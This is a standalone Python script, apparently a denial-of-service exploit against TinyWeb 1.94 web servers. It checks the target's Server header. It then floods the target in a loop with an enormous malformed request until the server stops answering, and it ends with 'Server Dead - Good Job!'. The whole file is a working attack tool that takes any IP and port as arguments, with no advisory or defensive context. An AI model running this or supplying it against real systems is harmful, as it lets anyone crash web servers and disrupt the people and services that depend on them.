import socket
import sys
import time
import argparse
import requests

def is_http_server(server_ip):
    try:
        # Attempt a standard GET request
        response = requests.get(f'http://{server_ip}')
        # Check if the response status code is a successful HTTP response
        return response.headers.get('Server') == "TinyWeb/1.94"
    except requests.RequestException:
        # Handle any exceptions that might occur (network issues, invalid responses, etc.)
        return False

def send_large_request_non_blocking(host, port, repeat_count):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.setblocking(0)  # Set socket to non-blocking mode

            # Prepare the data
            data = ('P' * 1024).encode('utf-8')
            total_sent = 0
            last_success_time = time.time()  # Initialize the last successful send time
            timeout = 15  # 10 seconds timeout

            while total_sent < repeat_count:
                try:
                    sent = s.send(data)
                    total_sent += sent
                    last_success_time = time.time()  # Update the last successful send time on successful send
                except BlockingIOError:
                    # If no data is sent and timeout is reached, stop trying
                    if time.time() - last_success_time > timeout:
                        print("Overload Sent - Next Cycle")
                        break
                    continue

            # Complete the request only if all data is sent
            if total_sent == repeat_count:
                s.send(b" / HTTP/1.1\r\nHost: " + host.encode('utf-8') + b"\r\n\r\n")

    except KeyboardInterrupt:
        print("Script interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"An error occurred: {e}")

def server_check(server_ip):
    while True:
        try:
            response = requests.get("http://" + server_ip, timeout=5)
            if response.status_code == 200:
                print("Server is still up and responding.")
            else:
                print(f"Server returned status code {response.status_code}. Considering as crashed.")
                sys.exit(1)
        except requests.exceptions.RequestException as e:
            print(f"Failed to reach the server: {e}")
            sys.exit(1)
        time.sleep(5)

def parse_arguments():
    parser = argparse.ArgumentParser(description="Send a large request to a specified IP and port.")
    parser.add_argument("ip", help="The IP address of the server.")
    parser.add_argument("port", type=int, help="The port number on the server.")
    return parser.parse_args()
# Example usage
args = parse_arguments()

if is_http_server(args.ip):
    print("Server validated as TinyWeb server, sending malformed request...")
else:
    print(args.ip + " is not a TinyWeb Server")
    sys.exit(0)
while True:
    if not is_http_server(args.ip):
        print("Server Dead - Good Job!")
        sys.exit(0)
    else:
        send_large_request_non_blocking(args.ip, args.port, 941114855)
